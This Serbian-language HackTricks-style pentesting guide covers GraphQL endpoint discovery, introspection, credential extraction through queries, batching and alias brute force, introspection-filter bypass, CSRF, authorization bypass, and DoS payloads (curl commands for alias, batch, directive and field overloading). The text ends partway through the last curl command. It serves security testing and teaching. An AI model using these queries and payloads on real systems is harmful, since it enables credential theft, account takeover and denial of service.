# GraphQL

{{#include ../../banners/hacktricks-training.md}}

## Uvod

GraphQL je **istaknut** kao **efikasna alternativa** REST API-ju, nudeći pojednostavljen pristup za upit podataka sa backend-a. U poređenju sa REST-om, koji često zahteva brojne zahteve preko različitih krajnjih tačaka da bi prikupio podatke, GraphQL omogućava preuzimanje svih potrebnih informacija putem **jednog zahteva**. Ova pojednostavljenja značajno **pomažu programerima** smanjujući složenost njihovih procesa preuzimanja podataka.

## GraphQL i bezbednost

Sa pojavom novih tehnologija, uključujući GraphQL, pojavljuju se i nove bezbednosne ranjivosti. Ključna tačka koju treba napomenuti je da **GraphQL po defaultu ne uključuje mehanizme autentifikacije**. Odgovornost je programera da implementiraju takve bezbednosne mere. Bez odgovarajuće autentifikacije, GraphQL krajnje tačke mogu izložiti osetljive informacije neautentifikovanim korisnicima, što predstavlja značajan bezbednosni rizik.

### Napadi brute force na direktorijume i GraphQL

Da bi se identifikovale izložene GraphQL instance, preporučuje se uključivanje specifičnih putanja u napade brute force na direktorijume. Ove putanje su:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Identifikacija otvorenih GraphQL instanci omogućava ispitivanje podržanih upita. Ovo je ključno za razumevanje podataka dostupnih preko krajnje tačke. GraphQL-ov introspekcioni sistem olakšava ovo detaljno prikazujući upite koje šema podržava. Za više informacija o tome, pogledajte GraphQL dokumentaciju o introspekciji: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Otisak

Alat [**graphw00f**](https://github.com/dolevf/graphw00f) je sposoban da detektuje koji GraphQL engine se koristi na serveru i zatim ispisuje neke korisne informacije za bezbednosnog audita.

#### Univerzalni upiti <a href="#universal-queries" id="universal-queries"></a>

Da bi se proverilo da li je URL GraphQL servis, može se poslati **univerzalni upit**, `query{__typename}`. Ako odgovor uključuje `{"data": {"__typename": "Query"}}`, to potvrđuje da URL hostuje GraphQL krajnju tačku. Ova metoda se oslanja na GraphQL-ovo polje `__typename`, koje otkriva tip upitnog objekta.
```javascript
query{__typename}
```
### Osnovna Enumeracija

Graphql obično podržava **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Iako se iz bezbednosnih razloga preporučuje da se dozvoli samo json kako bi se sprečili CSRF napadi.

#### Introspekcija

Da biste koristili introspekciju za otkrivanje informacija o šemi, upitite polje `__schema`. Ovo polje je dostupno na korenskom tipu svih upita.
```bash
query={__schema{types{name,fields{name}}}}
```
Sa ovom upitom ćete pronaći imena svih tipova koji se koriste: 

![](<../../images/image (1036).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
Sa ovom upitom možete izvući sve tipove, njihova polja i njihove argumente (i tip argumenata). Ovo će biti veoma korisno za razumevanje kako da upitujete bazu podataka.

![](<../../images/image (950).png>)

**Greške**

Zanimljivo je znati da li će se **greške** prikazivati jer će doprineti korisnim **informacijama.**
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../images/image (416).png>)

**Enumerisanje šeme baze podataka putem introspekcije**

> [!NOTE]
> Ako je introspekcija omogućena, ali gornji upit ne radi, pokušajte da uklonite `onOperation`, `onFragment` i `onField` direktive iz strukture upita.
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Инлајн интроспекција упит:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Poslednja linija koda je graphql upit koji će izbaciti sve meta-informacije iz graphql-a (imena objekata, parametre, tipove...)

![](<../../images/image (363).png>)

Ako je introspekcija omogućena, možete koristiti [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) da u GUI-u vidite sve opcije.

### Upit

Sada kada znamo koje vrste informacija su sačuvane unutar baze podataka, hajde da pokušamo da **izvučemo neke vrednosti**.

U introspekciji možete pronaći **koji objekat možete direktno upititi** (jer ne možete upititi objekat samo zato što postoji). Na sledećoj slici možete videti da se "_queryType_" zove "_Query_" i da je jedno od polja objekta "_Query_" "_flags_", što je takođe tip objekta. Stoga možete upititi objekat zastavice.

![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)

Napomena da je tip upita "_flags_" "_Flags_", i ovaj objekat je definisan kao ispod:

![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)

Možete videti da su objekti "_Flags_" sastavljeni od **name** i **value**. Zatim možete dobiti sve nazive i vrednosti zastavica sa upitom:
```javascript
query={flags{name, value}}
```
Napomena da, u slučaju da je **objekat za upit** **primitivni** **tip** kao što je **string**, kao u sledećem primeru

![](<../../images/image (958).png>)

Možete ga jednostavno upititi sa:
```javascript
query = { hiddenFlags }
```
U drugom primeru gde su bila 2 objekta unutar objekta tipa "_Query_": "_user_" i "_users_".\
Ako ovim objektima nisu potrebni argumenti za pretragu, mogli bismo **dobiti sve informacije iz njih** jednostavno **tražeći** podatke koje želimo. U ovom primeru sa Interneta mogli bismo izvući sačuvana korisnička imena i lozinke:

![](<../../images/image (880).png>)

Međutim, u ovom primeru, ako pokušate to da uradite, dobijate ovu **grešku**:

![](<../../images/image (1042).png>)

Izgleda da će nekako pretraživati koristeći argument "_**uid**_" tipa _**Int**_.\
U svakom slučaju, već smo to znali, u sekciji [Basic Enumeration](graphql.md#basic-enumeration) predložen je upit koji nam je pokazivao sve potrebne informacije: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Ako pročitate sliku koju sam priložio kada sam pokrenuo taj upit, videćete da je "_**user**_" imao **arg** "_**uid**_" tipa _Int_.

Dakle, obavljajući malo _**uid**_ bruteforce-a, otkrio sam da je za _**uid**=**1**_ dobijeno korisničko ime i lozinka:\
`query={user(uid:1){user,password}}`

![](<../../images/image (90).png>)

Napomena da sam **otkrio** da mogu da tražim **parametre** "_**user**_" i "_**password**_" jer ako pokušam da tražim nešto što ne postoji (`query={user(uid:1){noExists}}`) dobijam ovu grešku:

![](<../../images/image (707).png>)

I tokom **faze enumeracije** otkrio sam da objekat "_**dbuser**_" ima kao polja "_**user**_" i "_**password**_.

**Trik sa dump-ovanjem upitnog stringa (zahvaljujući @BinaryShadow\_)**

Ako možete da pretražujete po string tipu, kao: `query={theusers(description: ""){username,password}}` i **tražite praznu string** dobićete **dump svih podataka**. (_Napomena: ovaj primer nije povezan sa primerom iz tutorijala, za ovaj primer pretpostavite da možete pretraživati koristeći "**theusers**" po String polju nazvanom "**description**"_).

### Pretraga

U ovoj postavci, **baza podataka** sadrži **osobe** i **filmove**. **Osobe** se identifikuju po svom **emailu** i **imenu**; **filmovi** po svom **imenu** i **oceni**. **Osobe** mogu biti prijatelji jedni s drugima i takođe imati filmove, što ukazuje na odnose unutar baze podataka.

Možete **pretraživati** osobe **po** **imenu** i dobiti njihove email adrese:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Možete **pretraživati** osobe **po** **imenu** i dobiti njihove **pretplaćene** **filmove**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Napomena kako je naznačeno da se preuzme `name` od `subscribedMovies` osobe.

Takođe možete **pretraživati više objekata u isto vreme**. U ovom slučaju, pretražuju se 2 filma:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ili čak **odnosi nekoliko različitih objekata koristeći alias-e**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacije

**Mutacije se koriste za pravljenje promena na serverskoj strani.**

U **introspekciji** možete pronaći **deklarisane** **mutacije**. Na sledećem imidžu "_MutationType_" se naziva "_Mutation_" i objekat "_Mutation_" sadrži imena mutacija (kao što je "_addPerson_" u ovom slučaju):

![](<../../images/Screenshot from 2021-03-13 18-26-27 (1).png>)

U ovoj postavci, **baza podataka** sadrži **osobe** i **filmove**. **Osobe** se identifikuju po svom **emailu** i **imenu**; **filmovi** po svom **imenu** i **oceni**. **Osobe** mogu biti prijatelji jedni s drugima i takođe imati filmove, što ukazuje na odnose unutar baze podataka.

Mutacija za **kreiranje novih** filmova unutar baze podataka može izgledati kao sledeća (u ovom primeru mutacija se naziva `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Napomena kako su i vrednosti i tip podataka naznačeni u upitu.**

Pored toga, baza podataka podržava **mutation** operaciju, nazvanu `addPerson`, koja omogućava kreiranje **persons** zajedno sa njihovim povezivanjem sa postojećim **friends** i **movies**. Ključno je napomenuti da prijatelji i filmovi moraju prethodno postojati u bazi podataka pre nego što ih povežete sa novokreiranom osobom.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Direktiva Preopterećenja

Kao što je objašnjeno u [**jednoj od ranjivosti opisanim u ovom izveštaju**](https://www.landh.tech/blog/20240304-google-hack-50000/), direktiva preopterećenja podrazumeva pozivanje direktive čak i milion puta kako bi se server naterao da troši resurse dok nije moguće izvršiti DoS napad.

### Grupisanje brute-force u 1 API zahtevu

Ove informacije su preuzete sa [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentifikacija putem GraphQL API sa **istovremenim slanjem više upita sa različitim akreditivima** kako bi se proverilo. To je klasičan brute force napad, ali sada je moguće poslati više od jednog para korisničkog imena/lozinke po HTTP zahtevu zbog GraphQL funkcije grupisanja. Ovaj pristup bi prevario spoljne aplikacije za praćenje brzine misleći da je sve u redu i da ne postoji bot koji pokušava da pogodi lozinke.

Ispod možete pronaći najjednostavniju demonstraciju zahteva za autentifikaciju aplikacije, sa **3 različita para email/lozinka u isto vreme**. Očigledno je moguće poslati hiljade u jednom zahtevu na isti način:

![](<../../images/image (1081).png>)

Kao što možemo videti iz snimka odgovora, prvi i treći zahtevi su vratili _null_ i reflektovali odgovarajuće informacije u _error_ sekciji. **Druga mutacija je imala ispravne** podatke za autentifikaciju i odgovor ima ispravan token sesije za autentifikaciju.

![](<../../images/image (119) (1).png>)

## GraphQL Bez Introspekcije

Sve više **graphql krajnjih tačaka onemogućava introspekciju**. Međutim, greške koje graphql baca kada primi neočekivani zahtev su dovoljne za alate poput [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) da rekreiraju većinu šeme.

Štaviše, Burp Suite ekstenzija [**GraphQuail**](https://github.com/forcesunseen/graphquail) **posmatra GraphQL API zahteve koji prolaze kroz Burp** i **gradi** internu GraphQL **šemu** sa svakim novim upitom koji vidi. Takođe može izložiti šemu za GraphiQL i Voyager. Ekstenzija vraća lažni odgovor kada primi upit za introspekciju. Kao rezultat, GraphQuail prikazuje sve upite, argumente i polja dostupna za korišćenje unutar API-ja. Za više informacija [**proverite ovo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Lepa **lista reči** za otkrivanje [**GraphQL entiteta može se pronaći ovde**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Zaobilaženje GraphQL introspekcijskih odbrana <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Da bi se zaobišle restrikcije na upite za introspekciju u API-jima, umetanje **posebnog karaktera nakon `__schema` ključne reči** se pokazuje kao efikasno. Ova metoda koristi uobičajene propuste programera u regex obrascima koji imaju za cilj da blokiraju introspekciju fokusirajući se na `__schema` ključnu reč. Dodavanjem karaktera kao što su **razmaci, novi redovi i zarezi**, koje GraphQL ignoriše, ali možda nisu uzeti u obzir u regex-u, restrikcije se mogu zaobići. Na primer, upit za introspekciju sa novim redom nakon `__schema` može zaobići takve odbrane:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Ako ne uspete, razmotrite alternativne metode zahteva, kao što su **GET zahtevi** ili **POST sa `x-www-form-urlencoded`**, pošto se ograničenja mogu primenjivati samo na POST zahteve.

### Pokušajte sa WebSockets

Kao što je pomenuto u [**ovom predavanju**](https://www.youtube.com/watch?v=tIo_t5uUK50), proverite da li bi moglo biti moguće povezati se na graphQL putem WebSockets, jer bi to moglo omogućiti da zaobiđete potencijalni WAF i da komunikacija putem websocket-a otkrije šemu graphQL-a:
```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`,
}

var graphqlMsg = {
type: "GQL.START",
id: "1",
payload: GQL_CALL,
}
ws.send(JSON.stringify(graphqlMsg))
}
```
### **Otkrivanje Izloženih GraphQL Struktura**

Kada je introspekcija onemogućena, ispitivanje izvornog koda veb sajta za unapred učitane upite u JavaScript bibliotekama je korisna strategija. Ovi upiti se mogu pronaći koristeći `Sources` tab u alatima za razvoj, pružajući uvide u šemu API-ja i otkrivajući potencijalno **izložene osetljive upite**. Komande za pretragu unutar alata za razvoj su:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF u GraphQL-u

Ako ne znate šta je CSRF, pročitajte sledeću stranicu:

{{#ref}}
../../pentesting-web/csrf-cross-site-request-forgery.md
{{#endref}}

Tamo ćete moći da pronađete nekoliko GraphQL krajnjih tačaka **konfiguranih bez CSRF tokena.**

Napomena da se GraphQL zahtevi obično šalju putem POST zahteva koristeći Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Međutim, većina GraphQL krajnjih tačaka takođe podržava **`form-urlencoded` POST zahteve:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Zato, pošto se CSRF zahtevi poput prethodnih šalju **bez preflight zahteva**, moguće je **izvršiti** **promene** u GraphQL zloupotrebom CSRF.

Međutim, imajte na umu da je nova podrazumevana vrednost kolačića za `samesite` oznaku u Chrome-u `Lax`. To znači da će kolačić biti poslat samo sa treće strane u GET zahtevima.

Napomena je da je obično moguće poslati **query** **zahtev** takođe kao **GET** **zahtev i CSRF token možda neće biti validiran u GET zahtevu.**

Takođe, zloupotrebom [**XS-Search**](../../pentesting-web/xs-search/index.html) **napada** može biti moguće exfiltrirati sadržaj sa GraphQL krajnje tačke zloupotrebom kredencijala korisnika.

Za više informacija **proverite** [**originalni post ovde**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Preuzimanje WebSocket-a između sajtova u GraphQL

Slično CRSF ranjivostima koje zloupotrebljavaju GraphQL, takođe je moguće izvršiti **preuzimanje WebSocket-a između sajtova kako bi se zloupotrebila autentifikacija sa GraphQL sa nezaštićenim kolačićima** i naterati korisnika da izvrši neočekivane radnje u GraphQL.

Za više informacija proverite:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}

## Autorizacija u GraphQL

Mnoge GraphQL funkcije definisane na krajnjoj tački mogu samo proveravati autentifikaciju zahtevaoca, ali ne i autorizaciju.

Modifikovanje ulaznih varijabli upita može dovesti do osetljivih podataka o računu [leakovanih](https://hackerone.com/reports/792927).

Mutacija može čak dovesti do preuzimanja računa pokušavajući da modifikuje podatke o drugom računu.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass autorizacije u GraphQL

[Spajanje upita](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) može zaobići slab sistem autentifikacije.

U donjem primeru možete videti da je operacija "forgotPassword" i da bi trebala da izvrši samo forgotPassword upit povezan sa njom. Ovo se može zaobići dodavanjem upita na kraj, u ovom slučaju dodajemo "register" i promenljivu korisnika za sistem da se registruje kao novi korisnik.

<figure><img src="../../images/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Zaobilaženje ograničenja brzine korišćenjem aliasa u GraphQL

U GraphQL-u, aliasi su moćna funkcija koja omogućava **izričito imenovanje svojstava** prilikom slanja API zahteva. Ova sposobnost je posebno korisna za preuzimanje **više instanci istog tipa** objekta unutar jednog zahteva. Aliasi se mogu koristiti za prevazilaženje ograničenja koja sprečavaju GraphQL objekte da imaju više svojstava sa istim imenom.

Za detaljno razumevanje GraphQL aliasa, preporučuje se sledeći resurs: [Aliasi](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Dok je primarna svrha aliasa da smanji potrebu za brojnim API pozivima, identifikovan je nenamerni slučaj upotrebe gde se aliasi mogu iskoristiti za izvođenje brute force napada na GraphQL endpoint. Ovo je moguće jer su neki endpointi zaštićeni ograničivačima brzine dizajniranim da spreče brute force napade ograničavanjem **broja HTTP zahteva**. Međutim, ovi ograničivači brzine možda ne uzimaju u obzir broj operacija unutar svakog zahteva. S obzirom na to da aliasi omogućavaju uključivanje više upita u jedan HTTP zahtev, mogu zaobići takve mere ograničenja brzine.

Razmotrite primer dat ispod, koji ilustruje kako se aliasirani upiti mogu koristiti za proveru validnosti kodova za popust u prodavnici. Ova metoda bi mogla zaobići ograničenje brzine jer kompilira nekoliko upita u jedan HTTP zahtev, potencijalno omogućavajući proveru više kodova za popust istovremeno.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS u GraphQL-u

### Preopterećenje Alias-a

**Preopterećenje Alias-a** je GraphQL ranjivost gde napadači preopterećuju upit sa mnogo alias-a za isto polje, uzrokujući da backend resolver izvršava to polje ponovo i ponovo. Ovo može preopteretiti resurse servera, što dovodi do **Odbijanja Usluge (DoS)**. Na primer, u upitu ispod, isto polje (`expensiveField`) se traži 1.000 puta koristeći alias-e, primoravajući backend da ga izračuna 1.000 puta, potencijalno iscrpljujući CPU ili memoriju:
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
Da bi se to ublažilo, implementirajte ograničenja broja aliasa, analizu složenosti upita ili ograničavanje brzine kako biste sprečili zloupotrebu resursa.

### **Batchovanje upita zasnovano na nizu**

**Batchovanje upita zasnovano na nizu** je ranjivost gde GraphQL API omogućava batchovanje više upita u jednom zahtevu, omogućavajući napadaču da pošalje veliki broj upita istovremeno. Ovo može preopteretiti backend izvršavanjem svih batchovanih upita paralelno, trošeći prekomerne resurse (CPU, memorija, veze sa bazom podataka) i potencijalno dovesti do **Denial of Service (DoS)**. Ako ne postoji ograničenje na broj upita u batchu, napadač može iskoristiti ovo da pogorša dostupnost usluge.
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
U ovom primeru, 10 različitih upita je grupisano u jedan zahtev, prisiljavajući server da izvrši sve njih simultano. Ako se iskoristi sa većim brojem upita ili računski skupim upitima, može preopteretiti server.

### **Vulnerabilnost preopterećenja direktiva**

**Preopterećenje direktiva** se dešava kada GraphQL server dozvoljava upite sa prekomernim, dupliciranim direktivama. Ovo može preopteretiti parser i izvršitelj servera, posebno ako server ponovo obrađuje istu logiku direktive. Bez pravilne validacije ili ograničenja, napadač može iskoristiti ovo kreiranjem upita sa brojnim dupliciranim direktivama kako bi izazvao visoku potrošnju resursa ili memorije, što dovodi do **Denial of Service (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Napomena da je u prethodnom primeru `@aa` prilagođena direktiva koja **možda nije deklarisana**. Uobičajena direktiva koja obično postoji je **`@include`**:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Možete takođe poslati upit za introspekciju kako biste otkrili sve deklarisane direktive:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
I zatim **koristite neke od prilagođenih**.

### **Ranljivost duplikacije polja**

**Duplikacija polja** je ranljivost gde GraphQL server dozvoljava upite sa istim poljem ponovljenim prekomerno. Ovo prisiljava server da rešava polje suvišno za svaku instancu, trošeći značajne resurse (CPU, memoriju i pozive baze podataka). Napadač može kreirati upite sa stotinama ili hiljadama ponovljenih polja, uzrokujući visoko opterećenje i potencijalno dovodeći do **Odbijanja usluge (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename 